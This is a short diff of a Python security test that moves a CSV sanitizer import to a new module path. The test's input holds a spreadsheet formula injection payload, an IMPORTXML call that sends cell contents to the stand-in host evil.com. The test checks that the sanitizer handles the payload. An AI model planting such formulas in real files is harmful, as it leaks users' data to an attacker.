@@ -108,7 +108,7 @@ class TestConcurrencyIsolation:
 
 class TestSecurityFailures:
     def test_formula_injection_sanitized_not_crashed(self):
-        from app.services.security.csv_sanitizer import validate_and_sanitize_csv
+        from app.core.security.csv_sanitizer import validate_and_sanitize_csv
         content = b"cmd\n=IMPORTXML(concat(\"http://evil.com/?x=\",A1),\"//a\")"
         result = validate_and_sanitize_csv(content)
         assert result.df is not None
